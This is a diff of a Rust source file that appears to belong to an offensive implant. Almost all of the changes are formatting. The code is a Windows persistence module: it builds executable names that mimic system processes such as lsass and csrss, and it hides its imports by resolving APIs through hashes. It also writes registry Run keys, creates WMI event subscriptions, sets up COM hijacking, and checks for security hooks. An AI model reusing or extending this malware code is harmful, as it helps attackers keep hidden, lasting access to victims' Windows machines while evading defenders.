@@ -26,7 +26,9 @@ fn random_alphanum(discriminator: u64) -> String {
     let mut rng = StdRng::seed_from_u64(ioc_seed() ^ discriminator);
     let len = rng.gen_range(8..=12);
     const CHARSET: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
-    (0..len).map(|_| CHARSET[rng.gen_range(0..CHARSET.len())] as char).collect()
+    (0..len)
+        .map(|_| CHARSET[rng.gen_range(0..CHARSET.len())] as char)
+        .collect()
 }
 
 /// Generate a random valid CLSID string like `{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}`.
@@ -34,22 +36,31 @@ fn random_clsid(discriminator: u64) -> String {
     use rand::prelude::*;
     let mut rng = StdRng::seed_from_u64(ioc_seed() ^ discriminator);
     let mut hex = |n: usize| -> String {
-        (0..n).map(|_| {
-            let b = rng.gen_range(0u8..=15);
-            format!("{:x}", b)
-        }).collect()
+        (0..n)
+            .map(|_| {
+                let b = rng.gen_range(0u8..=15);
+                format!("{:x}", b)
+            })
+            .collect()
     };
-    format!("{{{}-{}-{}-{}-{}}}", hex(8), hex(4), hex(4), hex(4), hex(12))
+    format!(
+        "{{{}-{}-{}-{}-{}}}",
+        hex(8),
+        hex(4),
+        hex(4),
+        hex(4),
+        hex(12)
+    )
 }
 
 /// Legitimate-sounding Windows service/executable name components.
 const SVC_PREFIXES: &[&str] = &[
-    "ms", "win", "sys", "wua", "wmp", "dll", "svch", "ctf", "dwm", "lsass",
-    "smss", "csrss", "services", "spool", "taskhost", "runtime",
+    "ms", "win", "sys", "wua", "wmp", "dll", "svch", "ctf", "dwm", "lsass", "smss", "csrss",
+    "services", "spool", "taskhost", "runtime",
 ];
 const SVC_VERBS: &[&str] = &[
-    "update", "helper", "broker", "host", "svc", "core", "net", "sec",
-    "diag", "notify", "diag", "mgr", "disp", "sched",
+    "update", "helper", "broker", "host", "svc", "core", "net", "sec", "diag", "notify", "diag",
+    "mgr", "disp", "sched",
 ];
 
 /// Generate a random legitimate-sounding `.exe` filename.
@@ -112,12 +123,8 @@ pub use windows::*;
 #[cfg(windows)]
 pub mod windows {
     use super::{
-        Persist,
-        PersistenceConfig,
-        resolve_registry_value_name,
-        resolve_wmi_subscription_name,
-        resolve_com_hijack_clsid,
-        resolve_startup_filename,
+        resolve_com_hijack_clsid, resolve_registry_value_name, resolve_startup_filename,
+        resolve_wmi_subscription_name, Persist, PersistenceConfig,
     };
     use anyhow::{anyhow, Result};
     use std::path::PathBuf;
@@ -129,7 +136,7 @@ pub mod windows {
     // at runtime via pe_resolve hashing.  Only type definitions remain from
     // winapi — no function imports.
 
-    use crate::win_types::{GUID, DWORD, HMODULE, HRESULT, HANDLE, LONG};
+    use crate::win_types::{DWORD, GUID, HANDLE, HMODULE, HRESULT, LONG};
 
     /// Cast a raw function address to a typed function pointer.
     #[inline(always)]
@@ -159,11 +166,7 @@ pub mod windows {
     /// First tries PEB lookup; if that fails, loads the DLL via kernel32's
     /// LoadLibraryW, then resolves the function.
     #[inline(always)]
-    unsafe fn resolve_api_or_load<T>(
-        dll_wide: &[u16],
-        dll_hash: u32,
-        fn_hash: u32,
-    ) -> Option<T> {
+    unsafe fn resolve_api_or_load<T>(dll_wide: &[u16], dll_hash: u32, fn_hash: u32) -> Option<T> {
         if let Some(base) = pe_resolve::get_module_handle_by_hash(dll_hash) {
             if let Some(addr) = pe_resolve::get_proc_address_by_hash(base, fn_hash) {
                 return cast_fn(addr);
@@ -191,24 +194,49 @@ pub mod windows {
 
     /// "advapi32.dll" wide (no null)
     const ADVAPI32_W: &[u16] = &[
-        b'a' as u16, b'd' as u16, b'v' as u16, b'a' as u16, b'p' as u16,
-        b'i' as u16, b'3' as u16, b'2' as u16, b'.' as u16, b'd' as u16,
-        b'l' as u16, b'l' as u16,
+        b'a' as u16,
+        b'd' as u16,
+        b'v' as u16,
+        b'a' as u16,
+        b'p' as u16,
+        b'i' as u16,
+        b'3' as u16,
+        b'2' as u16,
+        b'.' as u16,
+        b'd' as u16,
+        b'l' as u16,
+        b'l' as u16,
     ];
     const HASH_ADVAPI32_DLL: u32 = hash_wstr_const(ADVAPI32_W);
 
     /// "ole32.dll" wide (no null)
     const OLE32_W: &[u16] = &[
-        b'o' as u16, b'l' as u16, b'e' as u16, b'3' as u16, b'2' as u16,
-        b'.' as u16, b'd' as u16, b'l' as u16, b'l' as u16,
+        b'o' as u16,
+        b'l' as u16,
+        b'e' as u16,
+        b'3' as u16,
+        b'2' as u16,
+        b'.' as u16,
+        b'd' as u16,
+        b'l' as u16,
+        b'l' as u16,
     ];
     const HASH_OLE32_DLL: u32 = hash_wstr_const(OLE32_W);
 
     /// "oleaut32.dll" wide (no null)
     const OLEAUT32_W: &[u16] = &[
-        b'o' as u16, b'l' as u16, b'e' as u16, b'a' as u16, b'u' as u16,
-        b't' as u16, b'3' as u16, b'2' as u16, b'.' as u16, b'd' as u16,
-        b'l' as u16, b'l' as u16,
+        b'o' as u16,
+        b'l' as u16,
+        b'e' as u16,
+        b'a' as u16,
+        b'u' as u16,
+        b't' as u16,
+        b'3' as u16,
+        b'2' as u16,
+        b'.' as u16,
+        b'd' as u16,
+        b'l' as u16,
+        b'l' as u16,
     ];
     const HASH_OLEAUT32_DLL: u32 = hash_wstr_const(OLEAUT32_W);
 
@@ -236,74 +264,106 @@ pub mod windows {
 
     type FnLoadLibraryW = unsafe extern "system" fn(*const u16) -> HMODULE;
 
-    type FnRegOpenKeyExW = unsafe extern "system" fn(
-        HANDLE, *const u16, u32, u32, *mut HANDLE,
-    ) -> i32;
+    type FnRegOpenKeyExW =
+        unsafe extern "system" fn(HANDLE, *const u16, u32, u32, *mut HANDLE) -> i32;
 
-    type FnRegSetValueExW = unsafe extern "system" fn(
-        HANDLE, *const u16, u32, u32, *const u8, u32,
-    ) -> i32;
+    type FnRegSetValueExW =
+        unsafe extern "system" fn(HANDLE, *const u16, u32, u32, *const u8, u32) -> i32;
 
     type FnRegCloseKey = unsafe extern "system" fn(HANDLE) -> i32;
 
-    type FnRegDeleteValueW = unsafe extern "system" fn(
-        HANDLE, *const u16,
-    ) -> i32;
+    type FnRegDeleteValueW = unsafe extern "system" fn(HANDLE, *const u16) -> i32;
 
-    type FnRegQueryValueExW = unsafe extern "system" fn(
-        HANDLE, *const u16, *mut u32, *mut u32, *mut u8, *mut u32,
-    ) -> i32;
+    type FnRegQueryValueExW =
+        unsafe extern "system" fn(HANDLE, *const u16, *mut u32, *mut u32, *mut u8, *mut u32) -> i32;
 
     type FnRegCreateKeyExW = unsafe extern "system" fn(
-        HANDLE, *const u16, u32, *mut u16, u32, u32,
-        *mut std::ffi::c_void, *mut HANDLE, *mut u32,
+        HANDLE,
+        *const u16,
+        u32,
+        *mut u16,
+        u32,
+        u32,
+        *mut std::ffi::c_void,
+        *mut HANDLE,
+        *mut u32,
     ) -> i32;
 
-    type FnRegDeleteTreeW = unsafe extern "system" fn(
-        HANDLE, *const u16,
-    ) -> i32;
+    type FnRegDeleteTreeW = unsafe extern "system" fn(HANDLE, *const u16) -> i32;
 
     type FnCoCreateInstance = unsafe extern "system" fn(
-        *const GUID, *mut std::ffi::c_void, DWORD, *const GUID, *mut *mut std::ffi::c_void,
+        *const GUID,
+        *mut std::ffi::c_void,
+        DWORD,
+        *const GUID,
+        *mut *mut std::ffi::c_void,
     ) -> HRESULT;
 
     type FnCoSetProxyBlanket = unsafe extern "system" fn(
-        *mut std::ffi::c_void, u32, u32, *mut std::ffi::c_void,
-        u32, u32, *mut std::ffi::c_void, u32,
+        *mut std::ffi::c_void,
+        u32,
+        u32,
+        *mut std::ffi::c_void,
+        u32,
+        u32,
+        *mut std::ffi::c_void,
+        u32,
     ) -> HRESULT;
 
-    type FnCoInitializeEx = unsafe extern "system" fn(
-        *mut std::ffi::c_void, DWORD,
-    ) -> HRESULT;
+    type FnCoInitializeEx = unsafe extern "system" fn(*mut std::ffi::c_void, DWORD) -> HRESULT;
 
     type FnCoUninitialize = unsafe extern "system" fn();
 
-    type FnSysAllocStringLen = unsafe extern "system" fn(
-        *const u16, u32,
-    ) -> *mut u16;
+    type FnSysAllocStringLen = unsafe extern "system" fn(*const u16, u32) -> *mut u16;
 
     type FnSysFreeString = unsafe extern "system" fn(*mut u16);
 
     type FnVariantClear = unsafe extern "system" fn(*mut std::ffi::c_void) -> HRESULT;
 
-    type FnGetModuleHandleExW = unsafe extern "system" fn(
-        u32, *const u16, *mut HMODULE,
-    ) -> i32;
+    type FnGetModuleHandleExW = unsafe extern "system" fn(u32, *const u16, *mut HMODULE) -> i32;
 
     // Wide strings for DLL loading (null-terminated)
     const ADVAPI32_DLL_W: &[u16] = &[
-        b'a' as u16, b'd' as u16, b'v' as u16, b'a' as u16, b'p' as u16,
-        b'i' as u16, b'3' as u16, b'2' as u16, b'.' as u16, b'd' as u16,
-        b'l' as u16, b'l' as u16, 0,
+        b'a' as u16,
+        b'd' as u16,
+        b'v' as u16,
+        b'a' as u16,
+        b'p' as u16,
+        b'i' as u16,
+        b'3' as u16,
+        b'2' as u16,
+        b'.' as u16,
+        b'd' as u16,
+        b'l' as u16,
+        b'l' as u16,
+        0,
     ];
     const OLE32_DLL_W: &[u16] = &[
-        b'o' as u16, b'l' as u16, b'e' as u16, b'3' as u16, b'2' as u16,
-        b'.' as u16, b'd' as u16, b'l' as u16, b'l' as u16, 0,
+        b'o' as u16,
+        b'l' as u16,
+        b'e' as u16,
+        b'3' as u16,
+        b'2' as u16,
+        b'.' as u16,
+        b'd' as u16,
+        b'l' as u16,
+        b'l' as u16,
+        0,
     ];
     const OLEAUT32_DLL_W: &[u16] = &[
-        b'o' as u16, b'l' as u16, b'e' as u16, b'a' as u16, b'u' as u16,
-        b't' as u16, b'3' as u16, b'2' as u16, b'.' as u16, b'd' as u16,
-        b'l' as u16, b'l' as u16, 0,
+        b'o' as u16,
+        b'l' as u16,
+        b'e' as u16,
+        b'a' as u16,
+        b'u' as u16,
+        b't' as u16,
+        b'3' as u16,
+        b'2' as u16,
+        b'.' as u16,
+        b'd' as u16,
+        b'l' as u16,
+        b'l' as u16,
+        0,
     ];
 
     // ── Resolved API helpers (resolve once, use via closure / local) ────
@@ -312,15 +372,12 @@ pub mod windows {
     /// resolution fails.
     #[inline(always)]
     unsafe fn registry_apis() -> Option<(FnRegOpenKeyExW, FnRegSetValueExW, FnRegCloseKey)> {
-        let open: FnRegOpenKeyExW = resolve_api_or_load(
-            ADVAPI32_DLL_W, HASH_ADVAPI32_DLL, HASH_REGOPENKEYEXW,
-        )?;
-        let set: FnRegSetValueExW = resolve_api_or_load(
-            ADVAPI32_DLL_W, HASH_ADVAPI32_DLL, HASH_REGSETVALUEEXW,
-        )?;
-        let close: FnRegCloseKey = resolve_api_or_load(
-            ADVAPI32_DLL_W, HASH_ADVAPI32_DLL, HASH_REGCLOSEKEY,
-        )?;
+        let open: FnRegOpenKeyExW =
+            resolve_api_or_load(ADVAPI32_DLL_W, HASH_ADVAPI32_DLL, HASH_REGOPENKEYEXW)?;
+        let set: FnRegSetValueExW =
+            resolve_api_or_load(ADVAPI32_DLL_W, HASH_ADVAPI32_DLL, HASH_REGSETVALUEEXW)?;
+        let close: FnRegCloseKey =
+            resolve_api_or_load(ADVAPI32_DLL_W, HASH_ADVAPI32_DLL, HASH_REGCLOSEKEY)?;
         Some((open, set, close))
     }
 
@@ -409,9 +466,11 @@ pub mod windows {
                 let (reg_open, _, reg_close) = registry_apis().ok_or_else(|| {
                     anyhow!("RegistryRunKey::remove: failed to resolve registry APIs")
                 })?;
-                let reg_del: FnRegDeleteValueW = resolve_api_or_load(
-                    ADVAPI32_DLL_W, HASH_ADVAPI32_DLL, HASH_REGDELETEVALUEW,
-                ).ok_or_else(|| anyhow!("RegistryRunKey::remove: failed to resolve RegDeleteValueW"))?;
+                let reg_del: FnRegDeleteValueW =
+                    resolve_api_or_load(ADVAPI32_DLL_W, HASH_ADVAPI32_DLL, HASH_REGDELETEVALUEW)
+                        .ok_or_else(|| {
+                            anyhow!("RegistryRunKey::remove: failed to resolve RegDeleteValueW")
+                        })?;
 
                 let mut hkey = ptr::null_mut();
                 let ret = reg_open(HKEY_CURRENT_USER, run_key.as_ptr(), 0, KEY_WRITE, &mut hkey);
@@ -448,9 +507,11 @@ pub mod windows {
                 let (reg_open, _, reg_close) = registry_apis().ok_or_else(|| {
                     anyhow!("RegistryRunKey::verify: failed to resolve registry APIs")
                 })?;
-                let reg_query: FnRegQueryValueExW = resolve_api_or_load(
-                    ADVAPI32_DLL_W, HASH_ADVAPI32_DLL, HASH_REGQUERYVALUEEXW,
-                ).ok_or_else(|| anyhow!("RegistryRunKey::verify: failed to resolve RegQueryValueExW"))?;
+                let reg_query: FnRegQueryValueExW =
+                    resolve_api_or_load(ADVAPI32_DLL_W, HASH_ADVAPI32_DLL, HASH_REGQUERYVALUEEXW)
+                        .ok_or_else(|| {
+                        anyhow!("RegistryRunKey::verify: failed to resolve RegQueryValueExW")
+                    })?;
 
                 let mut hkey = ptr::null_mut();
                 if reg_open(HKEY_CURRENT_USER, run_key.as_ptr(), 0, KEY_READ, &mut hkey) != 0 {
@@ -477,19 +538,37 @@ pub mod windows {
     // We define only the vtable slots we need.  Layout must match the real
     // COM vtables on every version of Windows; these match the MSDN/SDK
     // definitions exactly.
-    use crate::win_types::{REFIID, BSTR, IUnknown, IUnknownVtbl, VARIANT};
+    use crate::win_types::{IUnknown, IUnknownVtbl, BSTR, REFIID, VARIANT};
 
     // IWbemClassObject (partial vtable – only Put and Release are used)
     #[repr(C)]
     struct IWbemClassObjectVtbl {
         // IUnknown
-        pub query_interface: unsafe extern "system" fn(*mut IWbemClassObject, REFIID, *mut *mut std::ffi::c_void) -> HRESULT,
-        pub add_ref:         unsafe extern "system" fn(*mut IWbemClassObject) -> u32,
-        pub release:         unsafe extern "system" fn(*mut IWbemClassObject) -> u32,
+        pub query_interface: unsafe extern "system" fn(
+            *mut IWbemClassObject,
+            REFIID,
+            *mut *mut std::ffi::c_void,
+        ) -> HRESULT,
+        pub add_ref: unsafe extern "system" fn(*mut IWbemClassObject) -> u32,
+        pub release: unsafe extern "system" fn(*mut IWbemClassObject) -> u32,
         // IWbemClassObject – first 3 methods before Put
-        pub get_qualifier_set: unsafe extern "system" fn(*mut IWbemClassObject, *mut *mut std::ffi::c_void) -> HRESULT,
-        pub get:             unsafe extern "system" fn(*mut IWbemClassObject, BSTR, LONG, *mut VARIANT, *mut LONG, *mut LONG) -> HRESULT,
-        pub put:             unsafe extern "system" fn(*mut IWbemClassObject, BSTR, LONG, *mut VARIANT, LONG) -> HRESULT,
+        pub get_qualifier_set:
+            unsafe extern "system" fn(*mut IWbemClassObject, *mut *mut std::ffi::c_void) -> HRESULT,
+        pub get: unsafe extern "system" fn(
+            *mut IWbemClassObject,
+            BSTR,
+            LONG,
+            *mut VARIANT,
+            *mut LONG,
+            *mut LONG,
+        ) -> HRESULT,
+        pub put: unsafe extern "system" fn(
+            *mut IWbemClassObject,
+            BSTR,
+            LONG,
+            *mut VARIANT,
+            LONG,
+        ) -> HRESULT,
     }
     #[repr(C)]
     struct IWbemClassObject {
@@ -510,27 +589,135 @@ pub mod windows {
     //   20 ExecQuery, ...
     #[repr(C)]
     struct IWbemServicesVtbl {
-        pub query_interface:      unsafe extern "system" fn(*mut IWbemServices, REFIID, *mut *mut std::ffi::c_void) -> HRESULT,
-        pub add_ref:              unsafe extern "system" fn(*mut IWbemServices) -> u32,
-        pub release:              unsafe extern "system" fn(*mut IWbemServices) -> u32,
-        pub open_namespace:       unsafe extern "system" fn(*mut IWbemServices, BSTR, LONG, *mut IUnknown, *mut *mut IWbemServices, *mut *mut std::ffi::c_void) -> HRESULT,
-        pub cancel_async_call:    unsafe extern "system" fn(*mut IWbemServices, *mut std::ffi::c_void) -> HRESULT,
-        pub query_object_sink:    unsafe extern "system" fn(*mut IWbemServices, LONG, *mut *mut std::ffi::c_void) -> HRESULT,
-        pub get_object:           unsafe extern "system" fn(*mut IWbemServices, BSTR, LONG, *mut IUnknown, *mut *mut IWbemClassObject, *mut *mut std::ffi::c_void) -> HRESULT,
-        pub get_object_async:     unsafe extern "system" fn(*mut IWbemServices, BSTR, LONG, *mut IUnknown, *mut std::ffi::c_void) -> HRESULT,
-        pub put_class:            unsafe extern "system" fn(*mut IWbemServices, *mut IWbemClassObject, LONG, *mut IUnknown, *mut *mut std::ffi::c_void) -> HRESULT,
-        pub put_class_async:      unsafe extern "system" fn(*mut IWbemServices, *mut IWbemClassObject, LONG, *mut IUnknown, *mut std::ffi::c_void) -> HRESULT,
-        pub delete_class:         unsafe extern "system" fn(*mut IWbemServices, BSTR, LONG, *mut IUnknown, *mut *mut std::ffi::c_void) -> HRESULT,
-        pub delete_class_async:   unsafe extern "system" fn(*mut IWbemServices, BSTR, LONG, *mut IUnknown, *mut std::ffi::c_void) -> HRESULT,
-        pub create_class_enum:    unsafe extern "system" fn(*mut IWbemServices, BSTR, LONG, *mut IUnknown, *mut *mut std::ffi::c_void) -> HRESULT,
-        pub create_class_enum_async: unsafe extern "system" fn(*mut IWbemServices, BSTR, LONG, *mut IUnknown, *mut std::ffi::c_void) -> HRESULT,
-        pub put_instance:         unsafe extern "system" fn(*mut IWbemServices, *mut IWbemClassObject, LONG, *mut IUnknown, *mut *mut std::ffi::c_void) -> HRESULT,
-        pub put_instance_async:   unsafe extern "system" fn(*mut IWbemServices, *mut IWbemClassObject, LONG, *mut IUnknown, *mut std::ffi::c_void) -> HRESULT,
-        pub delete_instance:      unsafe extern "system" fn(*mut IWbemServices, BSTR, LONG, *mut IUnknown, *mut *mut std::ffi::c_void) -> HRESULT,
-        pub delete_instance_async: unsafe extern "system" fn(*mut IWbemServices, BSTR, LONG, *mut IUnknown, *mut std::ffi::c_void) -> HRESULT,
-        pub create_instance_enum: unsafe extern "system" fn(*mut IWbemServices, BSTR, LONG, *mut IUnknown, *mut *mut std::ffi::c_void) -> HRESULT,
-        pub create_instance_enum_async: unsafe extern "system" fn(*mut IWbemServices, BSTR, LONG, *mut IUnknown, *mut std::ffi::c_void) -> HRESULT,
-        pub exec_query:           unsafe extern "system" fn(*mut IWbemServices, BSTR, BSTR, LONG, *mut IUnknown, *mut *mut std::ffi::c_void) -> HRESULT,
+        pub query_interface: unsafe extern "system" fn(
+            *mut IWbemServices,
+            REFIID,
+            *mut *mut std::ffi::c_void,
+        ) -> HRESULT,
+        pub add_ref: unsafe extern "system" fn(*mut IWbemServices) -> u32,
+        pub release: unsafe extern "system" fn(*mut IWbemServices) -> u32,
+        pub open_namespace: unsafe extern "system" fn(
+            *mut IWbemServices,
+            BSTR,
+            LONG,
+            *mut IUnknown,
+            *mut *mut IWbemServices,
+            *mut *mut std::ffi::c_void,
+        ) -> HRESULT,
+        pub cancel_async_call:
+            unsafe extern "system" fn(*mut IWbemServices, *mut std::ffi::c_void) -> HRESULT,
+        pub query_object_sink: unsafe extern "system" fn(
+            *mut IWbemServices,
+            LONG,
+            *mut *mut std::ffi::c_void,
+        ) -> HRESULT,
+        pub get_object: unsafe extern "system" fn(
+            *mut IWbemServices,
+            BSTR,
+            LONG,
+            *mut IUnknown,
+            *mut *mut IWbemClassObject,
+            *mut *mut std::ffi::c_void,
+        ) -> HRESULT,
+        pub get_object_async: unsafe extern "system" fn(
+            *mut IWbemServices,
+            BSTR,
+            LONG,
+            *mut IUnknown,
+            *mut std::ffi::c_void,
+        ) -> HRESULT,
+        pub put_class: unsafe extern "system" fn(
+            *mut IWbemServices,
+            *mut IWbemClassObject,
+            LONG,
+            *mut IUnknown,
+            *mut *mut std::ffi::c_void,
+        ) -> HRESULT,
+        pub put_class_async: unsafe extern "system" fn(
+            *mut IWbemServices,
+            *mut IWbemClassObject,
+            LONG,
+            *mut IUnknown,
+            *mut std::ffi::c_void,
+        ) -> HRESULT,
+        pub delete_class: unsafe extern "system" fn(
+            *mut IWbemServices,
+            BSTR,
+            LONG,
+            *mut IUnknown,
+            *mut *mut std::ffi::c_void,
+        ) -> HRESULT,
+        pub delete_class_async: unsafe extern "system" fn(
+            *mut IWbemServices,
+            BSTR,
+            LONG,
+            *mut IUnknown,
+            *mut std::ffi::c_void,
+        ) -> HRESULT,
+        pub create_class_enum: unsafe extern "system" fn(
+            *mut IWbemServices,
+            BSTR,
+            LONG,
+            *mut IUnknown,
+            *mut *mut std::ffi::c_void,
+        ) -> HRESULT,
+        pub create_class_enum_async: unsafe extern "system" fn(
+            *mut IWbemServices,
+            BSTR,
+            LONG,
+            *mut IUnknown,
+            *mut std::ffi::c_void,
+        ) -> HRESULT,
+        pub put_instance: unsafe extern "system" fn(
+            *mut IWbemServices,
+            *mut IWbemClassObject,
+            LONG,
+            *mut IUnknown,
+            *mut *mut std::ffi::c_void,
+        ) -> HRESULT,
+        pub put_instance_async: unsafe extern "system" fn(
+            *mut IWbemServices,
+            *mut IWbemClassObject,
+            LONG,
+            *mut IUnknown,
+            *mut std::ffi::c_void,
+        ) -> HRESULT,
+        pub delete_instance: unsafe extern "system" fn(
+            *mut IWbemServices,
+            BSTR,
+            LONG,
+            *mut IUnknown,
+            *mut *mut std::ffi::c_void,
+        ) -> HRESULT,
+        pub delete_instance_async: unsafe extern "system" fn(
+            *mut IWbemServices,
+            BSTR,
+            LONG,
+            *mut IUnknown,
+            *mut std::ffi::c_void,
+        ) -> HRESULT,
+        pub create_instance_enum: unsafe extern "system" fn(
+            *mut IWbemServices,
+            BSTR,
+            LONG,
+            *mut IUnknown,
+            *mut *mut std::ffi::c_void,
+        ) -> HRESULT,
+        pub create_instance_enum_async: unsafe extern "system" fn(
+            *mut IWbemServices,
+            BSTR,
+            LONG,
+            *mut IUnknown,
+            *mut std::ffi::c_void,
+        ) -> HRESULT,
+        pub exec_query: unsafe extern "system" fn(
+            *mut IWbemServices,
+            BSTR,
+            BSTR,
+            LONG,
+            *mut IUnknown,
+            *mut *mut std::ffi::c_void,
+        ) -> HRESULT,
     }
     #[repr(C)]
     struct IWbemServices {
@@ -540,19 +727,23 @@ pub mod windows {
     // IWbemLocator (partial vtable – only ConnectServer)
     #[repr(C)]
     struct IWbemLocatorVtbl {
-        pub query_interface: unsafe extern "system" fn(*mut IWbemLocator, REFIID, *mut *mut std::ffi::c_void) -> HRESULT,
-        pub add_ref:         unsafe extern "system" fn(*mut IWbemLocator) -> u32,
-        pub release:         unsafe extern "system" fn(*mut IWbemLocator) -> u32,
-        pub connect_server:  unsafe extern "system" fn(
+        pub query_interface: unsafe extern "system" fn(
             *mut IWbemLocator,
-            BSTR,                        // strNetworkResource (namespace)
-            BSTR,                        // strUser
-            BSTR,                        // strPassword
-            BSTR,                        // strLocale
-            LONG,                        // lSecurityFlags
-            BSTR,                        // strAuthority
-            *mut std::ffi::c_void,       // pCtx
-            *mut *mut IWbemServices,     // ppNamespace (out)
+            REFIID,
+            *mut *mut std::ffi::c_void,
+        ) -> HRESULT,
+        pub add_ref: unsafe extern "system" fn(*mut IWbemLocator) -> u32,
+        pub release: unsafe extern "system" fn(*mut IWbemLocator) -> u32,
+        pub connect_server: unsafe extern "system" fn(
+            *mut IWbemLocator,
+            BSTR,                    // strNetworkResource (namespace)
+            BSTR,                    // strUser
+            BSTR,                    // strPassword
+            BSTR,                    // strLocale
+            LONG,                    // lSecurityFlags
+            BSTR,                    // strAuthority
+            *mut std::ffi::c_void,   // pCtx
+            *mut *mut IWbemServices, // ppNamespace (out)
         ) -> HRESULT,
     }
     #[repr(C)]
@@ -588,16 +779,20 @@ pub mod windows {
     //              6 Skip, 7 Clone
     #[repr(C)]
     struct IEnumWbemClassObjectVtbl {
-        pub query_interface: unsafe extern "system" fn(*mut IEnumWbemClassObject, REFIID, *mut *mut std::ffi::c_void) -> HRESULT,
-        pub add_ref:         unsafe extern "system" fn(*mut IEnumWbemClassObject) -> u32,
-        pub release:         unsafe extern "system" fn(*mut IEnumWbemClassObject) -> u32,
-        pub reset:           unsafe extern "system" fn(*mut IEnumWbemClassObject) -> HRESULT,
-        pub next:            unsafe extern "system" fn(
+        pub query_interface: unsafe extern "system" fn(
             *mut IEnumWbemClassObject,
-            LONG,                          // lTimeout
-            u32,                           // uCount
-            *mut *mut IWbemClassObject,    // apObjects
-            *mut u32,                      // puReturned
+            REFIID,
+            *mut *mut std::ffi::c_void,
+        ) -> HRESULT,
+        pub add_ref: unsafe extern "system" fn(*mut IEnumWbemClassObject) -> u32,
+        pub release: unsafe extern "system" fn(*mut IEnumWbemClassObject) -> u32,
+        pub reset: unsafe extern "system" fn(*mut IEnumWbemClassObject) -> HRESULT,
+        pub next: unsafe extern "system" fn(
+            *mut IEnumWbemClassObject,
+            LONG,                       // lTimeout
+            u32,                        // uCount
+            *mut *mut IWbemClassObject, // apObjects
+            *mut u32,                   // puReturned
         ) -> HRESULT,
     }
     #[repr(C)]
@@ -621,9 +816,8 @@ pub mod windows {
         /// Returns `None` if `SysAllocStringLen` could not be resolved or
         /// returns a null pointer (out-of-memory).
         unsafe fn new(s: &str) -> Option<Self> {
-            let sys_alloc: FnSysAllocStringLen = resolve_api_or_load(
-                OLEAUT32_DLL_W, HASH_OLEAUT32_DLL, HASH_SYSALLOCSTRINGLEN,
-            )?;
+            let sys_alloc: FnSysAllocStringLen =
+                resolve_api_or_load(OLEAUT32_DLL_W, HASH_OLEAUT32_DLL, HASH_SYSALLOCSTRINGLEN)?;
             let wide: Vec<u16> = s.encode_utf16().collect();
             let ptr = sys_alloc(wide.as_ptr(), wide.len() as u32);
             if ptr.is_null() {
@@ -643,9 +837,9 @@ pub mod windows {
         fn drop(&mut self) {
             if !self.ptr.is_null() {
                 unsafe {
-                    let sys_free: FnSysFreeString = resolve_api_or_load(
-                        OLEAUT32_DLL_W, HASH_OLEAUT32_DLL, HASH_SYSFREESTRING,
-                    ).expect("ComBstr::drop: failed to resolve SysFreeString");
+                    let sys_free: FnSysFreeString =
+                        resolve_api_or_load(OLEAUT32_DLL_W, HASH_OLEAUT32_DLL, HASH_SYSFREESTRING)
+                            .expect("ComBstr::drop: failed to resolve SysFreeString");
                     sys_free(self.ptr);
                 }
             }
@@ -693,9 +887,9 @@ pub mod windows {
         /// Useful when you need the HRESULT from VariantClear.
         unsafe fn clear(&mut self) -> HRESULT {
             self.cleared = true;
-            let variant_clear: FnVariantClear = resolve_api_or_load(
-                OLEAUT32_DLL_W, HASH_OLEAUT32_DLL, HASH_VARIANTCLEAR,
-            ).expect("ComVariant::clear: failed to resolve VariantClear");
+            let variant_clear: FnVariantClear =
+                resolve_api_or_load(OLEAUT32_DLL_W, HASH_OLEAUT32_DLL, HASH_VARIANTCLEAR)
+                    .expect("ComVariant::clear: failed to resolve VariantClear");
             variant_clear(&mut self.var as *mut _ as *mut std::ffi::c_void)
         }
     }
@@ -715,11 +909,7 @@ pub mod windows {
     }
 
     // Helper: set a BSTR property on an IWbemClassObject
-    unsafe fn put_bstr_prop(
-        obj: *mut IWbemClassObject,
-        name: &str,
-        value: &str,
-    ) -> HRESULT {
+    unsafe fn put_bstr_prop(obj: *mut IWbemClassObject, name: &str, value: &str) -> HRESULT {
         let name_bstr = match ComBstr::new(name) {
             Some(b) => b,
             None => return -1 as HRESULT, // E_POINTER / allocation failure
@@ -751,12 +941,20 @@ pub mod windows {
             .ok_or_else(|| anyhow!("get_bstr_prop: failed to allocate BSTR for '{}'", name))?;
         let mut cv = ComVariant::new();
         let hr = ((*(*obj).lpvtbl).get)(
-            obj, name_bstr.as_ptr(), 0,
-            cv.as_mut_ptr(), ptr::null_mut(), ptr::null_mut(),
+            obj,
+            name_bstr.as_ptr(),
+            0,
+            cv.as_mut_ptr(),
+            ptr::null_mut(),
+            ptr::null_mut(),
         );
         // name_bstr drops here
         if !crate::win_types::succeeded(hr) {
-            return Err(anyhow!("IWbemClassObject::Get('{}') failed: 0x{:08X}", name, hr));
+            return Err(anyhow!(
+                "IWbemClassObject::Get('{}') failed: 0x{:08X}",
+                name,
+                hr
+            ));
         }
         let vt = cv.vt();
         if vt != VT_BSTR {
@@ -803,9 +1001,9 @@ pub mod windows {
         const GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT: u32 = 0x00000002;
 
         // Resolve GetModuleHandleExW dynamically (kernel32)
-        let get_module_handle_ex: FnGetModuleHandleExW = resolve_api(
-            pe_resolve::HASH_KERNEL32_DLL, HASH_GETMODULEHANDLEEXW,
-        ).expect("resolve_spawn_instance: failed to resolve GetModuleHandleExW");
+        let get_module_handle_ex: FnGetModuleHandleExW =
+            resolve_api(pe_resolve::HASH_KERNEL32_DLL, HASH_GETMODULEHANDLEEXW)
+                .expect("resolve_spawn_instance: failed to resolve GetModuleHandleExW");
 
         // Read the vtable pointer from the object header.
         let vtbl = *(class_obj as *const *const usize);
@@ -828,8 +1026,8 @@ pub mod windows {
         // Both entries must belong to the same module (the WMI implementation
         // DLL, typically fastprox.dll).  A mismatch indicates an inline hook or
         // an unexpected vtable layout change.
-        let flags = GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS
-            | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT;
+        let flags =
+            GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT;
         let mut hmod_0: HMODULE = std::ptr::null_mut();
         let mut hmod_16: HMODULE = std::ptr::null_mut();
 
@@ -840,7 +1038,8 @@ pub mod windows {
             log::warn!(
                 "WmiSubscription: GetModuleHandleExW failed for vtable entries (ok0={}, ok16={}); \
                  cannot verify SpawnInstance location",
-                ok0, ok16
+                ok0,
+                ok16
             );
             return None;
         }
@@ -849,7 +1048,8 @@ pub mod windows {
